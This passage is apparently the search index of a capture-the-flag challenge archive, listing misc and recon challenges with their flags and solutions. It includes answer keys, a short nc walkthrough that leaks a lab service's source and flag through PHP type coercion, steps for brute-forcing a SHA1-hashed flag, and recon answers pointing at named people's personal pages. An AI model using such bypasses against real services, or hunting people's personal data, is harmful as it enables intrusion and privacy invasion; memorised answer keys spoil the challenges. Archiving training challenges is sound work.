            "text": "Bring me a receipt with the grand total (items + tax) of $13.37. There are some restrictions:\n- The receipt must be from within 1/2 mile of 6 MetroTech.\n- The receipt must be printed on receipt paper.\n- The receipt must be itemized with each item\u2019s price shown\n- No more than 4 items can be used to equal $13.37.\n- The purchase must be during the hours of the competition.\n- You must show the purchased items to the judges.\n- Tips, discretionary costs, and haggled costs do not count. Ideally every item would have a price sticker on it.\n- Flea Markets are not allowed.\n- Quantities are whole numbers. You can't use something measured by weight or equivalent.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/misc/1337/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/", 
            "text": "sanity_check\n\n\nAuthor\n\n\nCrowell\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nhi there! do you know this usually useless trick? no? well, that's too bad :(\n\n\nFlag\n\n\nSolution\n\n\n\n\nhttps://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/trivia100_sanitycheck/trivia100_sanitycheck_exploit.py\n\n\n\n\nSetup\n\n\nlibc.so.6_3f6aaa980b58f7c7590dee12d731e099\n\n\nsanity_check_76955449d82f05cbd7f84fa011da93ce", 
            "title": "Sanity Check"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#sanity_check", 
            "text": "", 
            "title": "sanity_check"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#author", 
            "text": "Crowell", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#description", 
            "text": "hi there! do you know this usually useless trick? no? well, that's too bad :(", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#solution", 
            "text": "https://github.com/aweinstock314/aweinstock-ctf-writeups/blob/master/csaw_finals_2015/trivia100_sanitycheck/trivia100_sanitycheck_exploit.py", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/misc/sanity-check/#setup", 
            "text": "libc.so.6_3f6aaa980b58f7c7590dee12d731e099  sanity_check_76955449d82f05cbd7f84fa011da93ce", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/", 
            "text": "MOAR CHESS\n\n\nAuthor\n\n\nPoints\n\n\n150\n\n\nDescription\n\n\nPlay a 3v1 chess game against Kevin.\nIf you want to play just let Kevin know. We can set the boards up.\nHere are the rules:\n- The standard rules of chess\n- Kevin plays 3 boards at once against 3 players from a team\n- A team can play at most 3 times an hour but it is still up to Kevin to accept or decline a challenge or even enforce this rule\n- You may not use an engine or other computer support. Only the players sitting at the table may provide moves\n- Kevin has 7 minutes on each board, each competitor has 5 minutes. (To allow time to move between boards)\n- Illegal moves that are called out are considered wins for either side\n- Kevin always plays white\n- The clock confirms the move meaning when you hit the clock you have confirmed your move and it is immutable\n- You must win 2 out of the 3 games.\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
            "title": "Moar Chess"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#moar-chess", 
            "text": "", 
            "title": "MOAR CHESS"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#points", 
            "text": "150", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#description", 
            "text": "Play a 3v1 chess game against Kevin.\nIf you want to play just let Kevin know. We can set the boards up.\nHere are the rules:\n- The standard rules of chess\n- Kevin plays 3 boards at once against 3 players from a team\n- A team can play at most 3 times an hour but it is still up to Kevin to accept or decline a challenge or even enforce this rule\n- You may not use an engine or other computer support. Only the players sitting at the table may provide moves\n- Kevin has 7 minutes on each board, each competitor has 5 minutes. (To allow time to move between boards)\n- Illegal moves that are called out are considered wins for either side\n- Kevin always plays white\n- The clock confirms the move meaning when you hit the clock you have confirmed your move and it is immutable\n- You must win 2 out of the 3 games.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/misc/moar-chess/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/", 
            "text": "Late Night Smash\n\n\nAuthor\n\n\nPoints\n\n\n50\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nBeat Kyle in a standard four stock.\nBest of 1\n\n\nFlag\n\n\nSolution\n\n\nSetup", 
            "title": "Late Night Smash"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#late-night-smash", 
            "text": "", 
            "title": "Late Night Smash"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#points", 
            "text": "50", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#description", 
            "text": "Beat Kyle in a standard four stock.\nBest of 1", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#solution", 
            "text": "", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2015/misc/late-night-smash/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/", 
            "text": "Title\n\n\nAuthor\n\n\nCohen\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nRecon\n\n\nDescription\n\n\nFigure out how to get Julian to go on a date with you.\n\n\nFlag\n\n\nflag{julian_will_not_date_you_sorry}\n\n\nSolution\n\n\nThis flag will be stored in Julian's newly cleared okcupid profile.\n\nhttp://www.okcupid.com/profile/TheJulianCohen/\n\n\nSetup", 
            "title": "Julian"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#title", 
            "text": "", 
            "title": "Title"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#author", 
            "text": "Cohen", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#category", 
            "text": "Recon", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#description", 
            "text": "Figure out how to get Julian to go on a date with you.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#flag", 
            "text": "flag{julian_will_not_date_you_sorry}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#solution", 
            "text": "This flag will be stored in Julian's newly cleared okcupid profile. http://www.okcupid.com/profile/TheJulianCohen/", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/misc/Julian/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/", 
            "text": "Kevin Chung\n\n\nAuthor\n\n\nChung\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nRecon\n\n\nDescription\n\n\nFind a picture of me that's from before I was a high school student. Submit the URL to the file on the internet\n\n\nFlag\n\n\nSolution\n\n\nhttp://www.siths.org/album/48915/23451.jpg\n\n\nSetup", 
            "title": "Kevin Chung"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#kevin-chung", 
            "text": "", 
            "title": "Kevin Chung"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#author", 
            "text": "Chung", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#category", 
            "text": "Recon", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#description", 
            "text": "Find a picture of me that's from before I was a high school student. Submit the URL to the file on the internet", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#flag", 
            "text": "", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#solution", 
            "text": "http://www.siths.org/album/48915/23451.jpg", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/misc/KevinChung/#setup", 
            "text": "", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/", 
            "text": "Regexpire\n\n\nAuthor\n\n\nPoints\n\n\n100\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nI thought I found a perfect match but she ended up being my regEx girlfriend.\nNote: You can't use newlines inside your match.\n\n\nFlag:\n\n\nflag{^regularly_express_yourself$}\n\n\nSolution\n\n\nSee \nsolution/", 
            "title": "Regexpire"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#regexpire", 
            "text": "", 
            "title": "Regexpire"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#author", 
            "text": "", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#points", 
            "text": "100", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#description", 
            "text": "I thought I found a perfect match but she ended up being my regEx girlfriend.\nNote: You can't use newlines inside your match.", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#flag", 
            "text": "flag{^regularly_express_yourself$}", 
            "title": "Flag:"
        }, 
        {
            "location": "/challenges/2016/misc/regexpire/#solution", 
            "text": "See  solution/", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/", 
            "text": "PPS\n\n\nAuthor\n\n\nWiens\n\n\nPoints\n\n\n200\n\n\nCategory\n\n\nMisc\n\n\nDescription\n\n\nFlag\n\n\nflag{ConsiderThisPUNishmentEnough}\n\n\nSolution\n\n\n\n\nLeak source\n\n\n\n\nnc localhost 5665\n4\npps.php\n2\n\n\n\n\n\n\n\nLeak flag\nWith the source, find the hidden password, evade the string matching via PHP's awesome forced coersion:\n\n\n\n\nnc localhost 5665\n5\n0xabadfad\nflag\n2\n\n\n\n\n\nSetup\n\n\nJust move the files from deploy somewhere on a filesystem. Preferrably give whatever runs the php no permissions to write anything anywhere. Then launch via xinetd on port 5665 (or whatever).", 
            "title": "PPS"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#pps", 
            "text": "", 
            "title": "PPS"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#author", 
            "text": "Wiens", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#points", 
            "text": "200", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#description", 
            "text": "", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#flag", 
            "text": "flag{ConsiderThisPUNishmentEnough}", 
            "title": "Flag"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#solution", 
            "text": "Leak source   nc localhost 5665\n4\npps.php\n2   Leak flag\nWith the source, find the hidden password, evade the string matching via PHP's awesome forced coersion:   nc localhost 5665\n5\n0xabadfad\nflag\n2", 
            "title": "Solution"
        }, 
        {
            "location": "/challenges/2014/misc/pps_-_Wiens/#setup", 
            "text": "Just move the files from deploy somewhere on a filesystem. Preferrably give whatever runs the php no permissions to write anything anywhere. Then launch via xinetd on port 5665 (or whatever).", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/", 
            "text": "ethersplay\n\n\nAuthor\n\n\nquend\n\n\nCategory\n\n\nMisc\n\n\nPoints\n\n\n400\n\n\nDescription\n\n\nI stole this contract from a private blockchain. Can you help me reverse its secrets?\n\n\nFLAG\n\n\nflag{ETHBTC_tothemoon}\n\n\nSetup\n\n\nDistribute .abi and .bytecode files.\n\n\nSolution\n\n\nIts solidity bytecode. So players must:\n1. figure out how to reverse it (the name of the challenge is a hint to tooling.\n2. figure out which function is a good target function - aka which has 'flag' in it\n3. find the winning path in the function - when you pass in the right username it will print out something different\n4. figure out what algo is used to hash the password (its SHA1)\n5. recover the flag through brute forcing 6 characters in SHA1\n6. submit the flag", 
            "title": "Ethersplay"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#ethersplay", 
            "text": "", 
            "title": "ethersplay"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#author", 
            "text": "quend", 
            "title": "Author"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#category", 
            "text": "Misc", 
            "title": "Category"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#points", 
            "text": "400", 
            "title": "Points"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#description", 
            "text": "I stole this contract from a private blockchain. Can you help me reverse its secrets?", 
            "title": "Description"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#flag", 
            "text": "flag{ETHBTC_tothemoon}", 
            "title": "FLAG"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#setup", 
            "text": "Distribute .abi and .bytecode files.", 
            "title": "Setup"
        }, 
        {
            "location": "/challenges/2017/misc/ethersplay/#solution", 
            "text": "Its solidity bytecode. So players must:\n1. figure out how to reverse it (the name of the challenge is a hint to tooling.\n2. figure out which function is a good target function - aka which has 'flag' in it\n3. find the winning path in the function - when you pass in the right username it will print out something different\n4. figure out what algo is used to hash the password (its SHA1)\n5. recover the flag through brute forcing 6 characters in SHA1\n6. submit the flag", 
            "title": "Solution"
        }
    ]
}